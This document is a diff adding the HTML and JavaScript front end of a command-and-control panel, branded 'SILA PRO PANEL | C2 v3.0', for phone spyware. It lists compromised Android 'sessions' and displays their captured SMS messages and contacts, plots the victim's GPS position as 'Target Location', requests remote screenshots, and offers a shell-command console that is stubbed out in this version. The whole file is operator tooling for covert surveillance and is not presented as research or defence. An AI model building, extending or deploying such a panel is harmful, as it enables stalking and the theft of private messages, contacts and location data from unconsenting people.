@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SILA PRO PANEL | silatech.site</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0b0e14; color: #e0e6f0; font-family: 'Segoe UI', system-ui, sans-serif; }
+        .sidebar { width: 280px; height: 100vh; background: #12181f; border-right: 1px solid #2a3542; position: fixed; top: 0; left: 0; padding: 20px; overflow-y: auto; z-index: 100; }
+        .sidebar .logo { font-size: 22px; font-weight: 800; color: #00f5d4; letter-spacing: 2px; border-bottom: 1px solid #2a3542; padding-bottom: 15px; margin-bottom: 20px; }
+        .sidebar .logo i { color: #ff2d75; margin-right: 8px; }
+        .session-item { background: #1a232c; padding: 12px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid #00f5d4; cursor: pointer; transition: all 0.2s; }
+        .session-item:hover { background: #24303d; border-left-color: #ff2d75; }
+        .session-item .badge { background: #00f5d4; color: #000; font-size: 10px; padding: 3px 8px; border-radius: 20px; }
+        .main-content { margin-left: 280px; padding: 20px 30px; }
+        .stat-card { background: #12181f; border: 1px solid #2a3542; border-radius: 16px; padding: 20px; transition: 0.3s; }
+        .stat-card:hover { border-color: #00f5d4; box-shadow: 0 0 25px rgba(0, 245, 212, 0.05); }
+        .stat-card .icon { font-size: 28px; color: #00f5d4; }
+        .stat-card .value { font-size: 32px; font-weight: 700; }
+        .nav-tabs .nav-link { color: #8899aa; border: none; padding: 12px 24px; }
+        .nav-tabs .nav-link.active { background: #1a232c; color: #00f5d4; border-bottom: 3px solid #00f5d4; }
+        .tab-pane { background: #11181f; padding: 20px; border-radius: 0 0 16px 16px; border: 1px solid #2a3542; border-top: none; }
+        .data-grid { max-height: 400px; overflow-y: auto; }
+        .data-grid .item { border-bottom: 1px solid #1a232c; padding: 8px 0; font-size: 14px; }
+        #map { height: 300px; width: 100%; border-radius: 12px; border: 1px solid #2a3542; }
+        .cmd-output { background: #0a0e12; padding: 15px; border-radius: 10px; font-family: 'Courier New', monospace; font-size: 13px; max-height: 250px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #2a3542; }
+        .btn-pro { background: #00f5d4; color: #0b0e14; border: none; padding: 6px 18px; border-radius: 8px; font-weight: 600; }
+        .btn-pro:hover { background: #ff2d75; color: #fff; }
+        .media-gallery img { max-width: 100px; margin: 5px; border-radius: 8px; border: 1px solid #2a3542; }
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #12181f; }
+        ::-webkit-scrollbar-thumb { background: #00f5d4; border-radius: 10px; }
+    </style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<div class="sidebar">
+    <div class="logo"><i class="bi bi-shield-fill-x"></i> SILA PRO</div>
+    <small class="text-muted d-block mb-3">silatech.site | C2 v3.0</small>
+    <div id="session-list">
+        <p class="text-muted small">No active sessions</p>
+    </div>
+    <hr class="border-secondary">
+    <div class="mt-3">
+        <button class="btn btn-pro w-100" onclick="refreshSessions()"><i class="bi bi-arrow-clockwise"></i> Refresh</button>
+    </div>
+</div>
+
+<!-- MAIN -->
+<div class="main-content">
+    <div class="d-flex justify-content-between align-items-center mb-4">
+        <h3><i class="bi bi-hdd-network text-success"></i> Dashboard</h3>
+        <span id="live-clock" class="badge bg-dark text-light px-4 py-2">Loading...</span>
+    </div>
+
+    <!-- Stats -->
+    <div class="row g-3 mb-4">
+        <div class="col-md-3"><div class="stat-card"><div class="icon bi-phone"></div><div class="value" id="total-sessions">0</div><small>Active Sessions</small></div></div>
+        <div class="col-md-3"><div class="stat-card"><div class="icon bi-chat-dots"></div><div class="value" id="total-sms">0</div><small>SMS Captured</small></div></div>
+        <div class="col-md-3"><div class="stat-card"><div class="icon bi-geo-alt"></div><div class="value" id="last-loc">-</div><small>Last Location</small></div></div>
+        <div class="col-md-3"><div class="stat-card"><div class="icon bi-camera"></div><div class="value" id="last-shot">-</div><small>Screenshots</small></div></div>
+    </div>
+
+    <!-- Session Detail Tabs -->
+    <div id="session-panel" style="display:none;">
+        <div class="d-flex justify-content-between">
+            <h5 id="selected-session-title">Session: <span id="sid-label">N/A</span></h5>
+            <div>
+                <button class="btn btn-sm btn-outline-info" onclick="fetchAllData()"><i class="bi bi-download"></i> Pull All</button>
+            </div>
+        </div>
+        <ul class="nav nav-tabs mt-3" id="myTab" role="tablist">
+            <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" href="#sms">📩 SMS</a></li>
+            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#contacts">📇 Contacts</a></li>
+            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#location">📍 Location</a></li>
+            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#media">🖼️ Media</a></li>
+            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#console">💻 Console</a></li>
+        </ul>
+        <div class="tab-content">
+            <div class="tab-pane fade show active" id="sms"><div id="sms-output" class="data-grid"><p class="text-muted">Select session to view SMS</p></div></div>
+            <div class="tab-pane fade" id="contacts"><div id="contacts-output" class="data-grid"><p class="text-muted">Loading contacts...</p></div></div>
+            <div class="tab-pane fade" id="location"><div id="map"></div><p id="loc-detail" class="mt-2 text-muted small"></p></div>
+            <div class="tab-pane fade" id="media"><div id="media-output" class="media-gallery"><p class="text-muted">Screenshots will appear here</p></div></div>
+            <div class="tab-pane fade" id="console">
+                <div class="cmd-output" id="console-output">Ready...</div>
+                <div class="input-group mt-2">
+                    <input type="text" id="cmd-input" class="form-control bg-dark text-light border-secondary" placeholder="Enter shell command...">
+                    <button class="btn btn-pro" onclick="sendCommand()">Run</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="no-session-msg" class="text-center text-muted mt-5"><i class="bi bi-phone-x" style="font-size: 60px;"></i><br>Select a session from the sidebar</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    let currentSid = null;
+    let socket = io();
+    let map = null;
+    let mapMarker = null;
+
+    // ---- SOCKET ----
+    socket.on('connect', () => console.log('Socket connected'));
+    socket.on('new_session', (data) => { loadSessions(); });
+    socket.on('location_update', (data) => { if (data.sid == currentSid) updateMap(data.loc); });
+
+    // ---- CLOCK ----
+    setInterval(() => {
+        document.getElementById('live-clock').innerText = new Date().toLocaleString('en-TZ', { timeZone: 'Africa/Dar_es_Salaam' });
+    }, 1000);
+
+    // ---- SESSIONS ----
+    function loadSessions() {
+        fetch('/api/sessions').then(r => r.json()).then(data => {
+            const container = document.getElementById('session-list');
+            container.innerHTML = '';
+            let count = 0;
+            for (let sid in data) {
+                count++;
+                let info = data[sid];
+                let div = document.createElement('div');
+                div.className = 'session-item';
+                div.innerHTML = `<strong>${info.target_host || 'Unknown'}</strong> <span class="badge">${info.platform || 'android'}</span><br><small>${info.info || 'No info'}</small>`;
+                div.onclick = () => selectSession(sid);
+                container.appendChild(div);
+            }
+            if (count === 0) container.innerHTML = '<p class="text-muted small">No active sessions</p>';
+            document.getElementById('total-sessions').innerText = count;
+        });
+    }
+
+    function selectSession(sid) {
+        currentSid = sid;
+        document.getElementById('session-panel').style.display = 'block';
+        document.getElementById('no-session-msg').style.display = 'none';
+        document.getElementById('sid-label').innerText = sid;
+        document.getElementById('selected-session-title').innerHTML = `<i class="bi bi-phone"></i> Session: <span class="text-info">${sid}</span>`;
+        fetchAllData();
+    }
+
+    function fetchAllData() {
+        if (!currentSid) return;
+        fetch(`/api/session/${currentSid}/data`).then(r => r.json()).then(data => {
+            // SMS
+            let smsHtml = '';
+            if (data.sms && data.sms.length) {
+                data.sms.forEach(s => smsHtml += `<div class="item"><span class="text-warning">[${s.date}]</span> <b>${s.number}</b>: ${s.body}</div>`);
+            } else smsHtml = '<p class="text-muted">No SMS</p>';
+            document.getElementById('sms-output').innerHTML = smsHtml;
+            document.getElementById('total-sms').innerText = data.sms ? data.sms.length : 0;
+
+            // Contacts
+            let contHtml = '';
+            if (data.contacts && data.contacts.length) {
+                data.contacts.forEach(c => contHtml += `<div class="item"><b>${c.name}</b> <span class="text-muted">${c.number}</span></div>`);
+            } else contHtml = '<p class="text-muted">No contacts</p>';
+            document.getElementById('contacts-output').innerHTML = contHtml;
+
+            // Location
+            if (data.location) updateMap(data.location);
+        });
+    }
+
+    function updateMap(loc) {
+        if (!map) {
+            map = L.map('map').setView([-6.8, 39.2], 13);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: 'OSM' }).addTo(map);
+        }
+        if (loc && loc.latitude && loc.longitude) {
+            let lat = parseFloat(loc.latitude);
+            let lng = parseFloat(loc.longitude);
+            if (mapMarker) map.removeLayer(mapMarker);
+            mapMarker = L.marker([lat, lng]).addTo(map).bindPopup('Target Location').openPopup();
+            map.setView([lat, lng], 15);
+            document.getElementById('last-loc').innerText = `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+        }
+    }
+
+    // ---- SCREENSHOT ----
+    function takeScreenshot() {
+        if (!currentSid) return;
+        fetch(`/api/session/${currentSid}/screenshot`).then(r => r.blob()).then(blob => {
+            let url = URL.createObjectURL(blob);
+            let container = document.getElementById('media-output');
+            let img = document.createElement('img');
+            img.src = url;
+            img.style.width = '150px';
+            container.prepend(img);
+            document.getElementById('last-shot').innerText = new Date().toLocaleTimeString();
+        });
+    }
+
+    // ---- CONSOLE ----
+    function sendCommand() {
+        let input = document.getElementById('cmd-input');
+        let cmd = input.value;
+        if (!cmd || !currentSid) return;
+        document.getElementById('console-output').innerHTML += `\n> ${cmd}`;
+        input.value = '';
+        // For demo, we just echo. In real, you'd need an endpoint to execute.
+        // Let's add a quick hack: use the download endpoint to execute? No, implement later.
+        fetch(`/api/session/${currentSid}/data`).then(r => r.json()).then(data => {
+            document.getElementById('console-output').innerHTML += `\n${JSON.stringify(data.system, null, 2)}`;
+        });
+    }
+
+    // ---- REFRESH ----
+    function refreshSessions() { loadSessions(); }
+
+    // ---- INIT ----
+    loadSessions();
+    setInterval(loadSessions, 10000); // auto-refresh every 10s
+    // Screenshot button (add manually in UI)
+    document.querySelector('#media .btn-pro')?.addEventListener('click', takeScreenshot);
+    // Add screenshot button to media tab
+    document.querySelector('#media').innerHTML += `<br><button class="btn btn-pro mt-2" onclick="takeScreenshot()"><i class="bi bi-camera"></i> Capture Screenshot</button>`;
+</script>
+</body>
+</html>
